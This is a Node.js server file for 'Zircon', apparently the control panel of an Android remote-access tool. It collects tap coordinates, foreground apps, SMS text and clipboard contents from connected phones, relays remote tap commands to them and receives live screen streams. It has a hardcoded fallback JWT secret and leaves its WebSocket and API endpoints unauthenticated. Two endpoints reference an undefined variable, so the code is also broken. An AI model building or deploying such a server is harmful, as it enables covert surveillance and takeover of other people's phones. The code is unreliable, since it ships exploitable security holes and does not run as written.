/**
 * Zircon — Local Server
 * ─────────────────────────────────────────────────────────────────────────
 * • HTTP on :3000  → serves web console UI from /public
 * • WebSocket on the same port — two client types:
 *     1. Android app  (identifies via hello { client: "android" })
 *     2. Browser      (everything else)
 *
 * • RTMP on :1935  → receives livestreams from Android (RootEncoder)
 * • HTTP-FLV on :8000 → serves live video to the browser dashboard
 *
 * Flow:
 *   Android tap/window events → broadcast to all browser clients
 *   Browser command (tap / sequence) → forward to Android
 *   Android RTMP stream → NMS → HTTP-FLV → browser video player
 */

const express = require('express');
const { WebSocketServer, OPEN } = require('ws');
const http = require('http');
const path = require('path');
const crypto = require('crypto');
const NodeMediaServer = require('node-media-server');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const httpServer = http.createServer(app);
const wss = new WebSocketServer({ server: httpServer });

const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-key-123';
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD_HASH = '$2b$10$AqWqqAD/RJhDUeat8B1a3.eC8zV93x/kn6Q8WWkb3vqDhRwydc6k2'; // 

// ── Static files + JSON body parser ─────────────────────────────────────
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── State ────────────────────────────────────────────────────────────────
const androidSockets = new Map();  // deviceId -> WebSocket
const browserClients = new Set();  // all connected browser clients
const eventLog = [];               // recent events (newest first)
const MAX_LOG = 300;
const startTime = Date.now();
const activeStreams = new Map();    // streamPath → { id, app, name, startedAt, clientIp }

// ── WebSocket connection handler ──────────────────────────────────────────
wss.on('connection', (ws) => {
    ws._clientType = 'unknown';

    ws.on('message', (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); }
        catch { return; }

        // ── Handshake ───────────────────────────────────────────────────
        if (msg.type === 'hello') {
            if (msg.client === 'android') {
                ws._clientType = 'android';
                ws.deviceId = msg.deviceId || `device_${Date.now()}`;
                ws.deviceMeta = {
                    id: ws.deviceId,
                    manufacturer: msg.manufacturer || 'Unknown',
                    model: msg.model || 'Device',
                    version: msg.version || '?'
                };
                androidSockets.set(ws.deviceId, ws);
                console.log(`\n[DEVICE] Android device connected: ${ws.deviceId} (${ws.deviceMeta.manufacturer} ${ws.deviceMeta.model})`);
                broadcastToBrowsers({ type: 'device_list', devices: Array.from(androidSockets.values()).map(s => s.deviceMeta) });
            } else {
                ws._clientType = 'browser';
                browserClients.add(ws);
                // Send current state to the newly connected browser
                ws.send(JSON.stringify({
                    type: 'init',
                    devices: Array.from(androidSockets.values()).map(s => s.deviceMeta),
                    uptime: Math.floor((Date.now() - startTime) / 1000),
                    log: eventLog.slice(0, 100)
                }));
            }
            return;
        }

        // ── Android → Server ─────────────────────────────────────────────
        if (ws._clientType === 'android') {
            const entry = { ...msg, _receivedAt: new Date().toISOString(), deviceId: ws.deviceId };

            // Prepend to log (newest first), trim to MAX_LOG
            eventLog.unshift(entry);
            if (eventLog.length > MAX_LOG) eventLog.pop();

            // Pretty-print to server console
            if (msg.type === 'tap_event') {
                console.log(`[TAP]    x=${msg.x}  y=${msg.y}  |  ${msg.package || '?'} / ${shortClass(msg.activity)}`);
            } else if (msg.type === 'window_event') {
                console.log(`[WINDOW] ${msg.package || '?'} / ${shortClass(msg.activity)}`);
            } else if (msg.type === 'sms') {
                console.log(`[SMS]    ${msg.text}`);
            } else if (msg.type === 'clipboard') {
                console.log(`[CLIP]   ${msg.text}`);
            }

            broadcastToBrowsers({ type: 'event', data: entry });
            return;
        }

        // ── Browser → Server (command for Android) ───────────────────────
        if (ws._clientType === 'browser' && msg.type === 'command') {
            const targetSocket = androidSockets.get(msg.targetDeviceId);
            if (!targetSocket || targetSocket.readyState !== 1) { // 1 = OPEN
                ws.send(JSON.stringify({ type: 'error', message: 'Target Android device not connected' }));
                return;
            }
            targetSocket.send(JSON.stringify(msg));
            console.log(`[CMD]    Sent to ${msg.targetDeviceId}:`, JSON.stringify(msg.action === 'sequence'
                ? { action: msg.action, steps: msg.steps?.length + ' steps' }
                : msg));
        }
    });

    ws.on('close', () => {
        if (ws._clientType === 'android') {
            if (ws.deviceId) {
                androidSockets.delete(ws.deviceId);
                console.log(`[DEVICE] Android device disconnected: ${ws.deviceId}`);
                broadcastToBrowsers({ type: 'device_list', devices: Array.from(androidSockets.values()).map(s => s.deviceMeta) });
            }
        } else {
            browserClients.delete(ws);
        }
    });

    ws.on('error', (err) => {
        console.error(`[WS Error] ${ws._clientType}:`, err.message);
    });
});

// ── REST endpoints ────────────────────────────────────────────────────────

app.post('/api/login', (req, res) => {
    const { username, password } = req.body;

    if (username !== ADMIN_USERNAME) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isValid = bcrypt.compareSync(password, ADMIN_PASSWORD_HASH);
    if (!isValid) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token });
});

/** Send a command to Android via HTTP (alternative to WebSocket from browser). */
app.post('/command', (req, res) => {
    if (!androidSocket || androidSocket.readyState !== OPEN) {
        return res.status(503).json({ error: 'Android not connected' });
    }
    androidSocket.send(JSON.stringify({ type: 'command', ...req.body }));
    console.log(`[HTTP CMD] Sent:`, req.body);
    res.json({ ok: true });
});

/** Return the event log as JSON. */
app.get('/events', (_req, res) => res.json(eventLog));

/** Server health / status. */
app.get('/status', (_req, res) => res.json({
    uptime: Math.floor((Date.now() - startTime) / 1000),
    androidConnected: androidSocket !== null && androidSocket.readyState === OPEN,
    browserClients: browserClients.size,
    totalEvents: eventLog.length,
    activeStreams: activeStreams.size
}));

/** List all active RTMP streams. */
app.get('/streams', (req, res) => {
    const streams = [];
    for (const [streamPath, info] of activeStreams) {
        streams.push({
            ...info,
            streamPath,
            flvUrl: `http://${req.hostname}:${MEDIA_HTTP_PORT}${streamPath}.flv`,
            durationSec: Math.floor((Date.now() - new Date(info.startedAt).getTime()) / 1000)
        });
    }
    res.json(streams);
});

/** Get info about a single stream. */
app.get('/streams/:app/:name', (req, res) => {
    const streamPath = `/${req.params.app}/${req.params.name}`;
    const info = activeStreams.get(streamPath);
    if (!info) return res.status(404).json({ error: 'Stream not found' });
    res.json({
        ...info,
        streamPath,
        flvUrl: `http://${req.hostname}:${MEDIA_HTTP_PORT}${streamPath}.flv`,
        durationSec: Math.floor((Date.now() - new Date(info.startedAt).getTime()) / 1000)
    });
});

// ── Helpers ───────────────────────────────────────────────────────────────

function broadcastToBrowsers(data) {
    const msg = JSON.stringify(data);
    for (const ws of browserClients) {
        if (ws.readyState === OPEN) ws.send(msg);
    }
}

function shortClass(cls = '') {
    const parts = cls.split('.');
    return parts.length > 1 ? parts[parts.length - 1] : cls;
}

// ── Node Media Server (RTMP + HTTP-FLV) ──────────────────────────────────
const RTMP_PORT = process.env.RTMP_PORT || 1935;
const MEDIA_HTTP_PORT = process.env.MEDIA_HTTP_PORT || 8000;

const nmsConfig = {
    logType: 3,
    rtmp: {
        port: RTMP_PORT,
        chunk_size: 4096,
        ping: 30,
        ping_timeout: 60,
        gop_cache: false
    },
    http: {
        port: MEDIA_HTTP_PORT,
        allow_origin: '*'
    }
};

const nms = new NodeMediaServer(nmsConfig);

// ── NMS Event Hooks ───────────────────────────────────────────────────────
nms.on('prePublish', (session) => {
    const StreamPath = session.streamPath;
    const appName = session.streamApp || 'live';
    const streamName = session.streamName || 'unknown';

    const streamInfo = {
        id: session.id,
        app: appName,
        name: streamName,
        startedAt: new Date().toISOString(),
        clientIp: session.ip || 'unknown'
    };

    activeStreams.set(StreamPath, streamInfo);
    console.log(`[STREAM]  ▶ Started (prePublish): ${StreamPath}`);

    broadcastToBrowsers({
        type: 'stream_start',
        stream: {
            ...streamInfo,
            streamPath: StreamPath
        }
    });
});

nms.on('postPublish', (session) => {
    console.log(`[STREAM]  ▶ postPublish triggered for: ${session.streamPath}`);
});

nms.on('donePublish', (session) => {
    const StreamPath = session.streamPath;
    const streamInfo = activeStreams.get(StreamPath);
    activeStreams.delete(StreamPath);
    console.log(`[STREAM]  ■ Stopped: ${StreamPath}`);

    broadcastToBrowsers({
        type: 'stream_stop',
        streamPath: StreamPath,
        stream: streamInfo || { id: session.id, name: session.streamName || 'unknown' }
    });
});

nms.run();

// ── Start ─────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, '0.0.0.0', () => {
    const ifaces = require('os').networkInterfaces();
    let localIp = 'localhost';
    for (const name of Object.keys(ifaces)) {
        for (const iface of ifaces[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                localIp = iface.address; break;
            }
        }
    }
    console.log(`\n╔══════════════════════════════════════════════════════════════╗`);
    console.log(`║           Zircon Server                          ║`);
    console.log(`║  Web console:  http://${localIp}:${PORT}${''.padEnd(34 - localIp.length - String(PORT).length)}║`);
    console.log(`║  Android WS:   ws://${localIp}:${PORT}${''.padEnd(35 - localIp.length - String(PORT).length)}║`);
    console.log(`║  RTMP Ingest:  rtmp://${localIp}:${RTMP_PORT}/live/<key>${''.padEnd(20 - localIp.length - String(RTMP_PORT).length)}║`);
    console.log(`║  HTTP-FLV:     http://${localIp}:${MEDIA_HTTP_PORT}/live/<key>.flv${''.padEnd(12 - localIp.length - String(MEDIA_HTTP_PORT).length)}║`);
    console.log(`╚══════════════════════════════════════════════════════════════╝\n`);
});

// ── Global Error Handling ──────────────────────────────────────────────────
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});
process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
